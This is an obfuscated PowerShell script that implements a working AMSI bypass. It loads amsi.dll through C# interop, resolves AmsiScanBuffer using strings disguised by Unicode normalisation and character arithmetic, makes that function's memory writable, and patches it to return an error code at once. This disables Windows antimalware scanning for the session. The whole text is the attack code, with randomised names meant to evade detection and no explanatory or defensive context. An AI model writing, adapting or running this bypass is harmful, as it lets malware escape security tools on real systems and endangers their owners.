$FyRMqVl = @"
using System;
using System.Runtime.InteropServices;
public class FyRMqVl {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _hxKUdqI, string Xx2OBSEEg9jRF);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr gxtDlB1i8ZKoC, UIntPtr zmuqo8rWoRCOpQ7F6, uint T1F_V5BHOmnZ1fPjMx_, out uint dqyPeIToN);
}
"@

Add-Type $FyRMqVl

$ylT = [FyRMqVl]::LoadLibrary("$(('ãm'+'sí'+'.d'+'ll').norMALizE([char](70*5/5)+[CHAR](111*12/12)+[cHaR]([ByTe]0x72)+[CHar](109+49-49)+[CHAR](68)) -replace [cHar]([ByTe]0x5c)+[ChAr](112+32-32)+[ChAR](114+9)+[chAr]([byTe]0x4d)+[ChAr](25+85)+[cHaR](52+73))")
$SyJXF8_z = [FyRMqVl]::GetProcAddress($ylT, "$(('ÃmsíScänB'+'úffêr').NoRmalIZE([cHaR]([bytE]0x46)+[chaR]([bytE]0x6f)+[CHAr](114*17/17)+[ChaR](109+55-55)+[cHAr]([bYtE]0x44)) -replace [cHAr]([byte]0x5c)+[cHAR]([BYtE]0x70)+[ChAr]([Byte]0x7b)+[chaR](77*36/36)+[CHaR]([BYTe]0x6e)+[CHAR]([BYTE]0x7d))")
$p = 0
[FyRMqVl]::VirtualProtect($SyJXF8_z, [uint32]5, 0x40, [ref]$p)
$uE0jUqs2 = "0xB8"
$mvyf5ZozUmu = "0x57"
$oZoG_Zktpa_WLc = "0x00"
$iZm0qii7tR7 = "0x07"
$qyLNFKVZ8RcdXMM = "0x80"
$N4CFuy7wqhWYDa = "0xC3"
$h79O = [Byte[]] ($uE0jUqs2,$mvyf5ZozUmu,$oZoG_Zktpa_WLc,$iZm0qii7tR7,+$qyLNFKVZ8RcdXMM,+$N4CFuy7wqhWYDa)
[System.Runtime.InteropServices.Marshal]::Copy($h79O, 0, $SyJXF8_z, 6)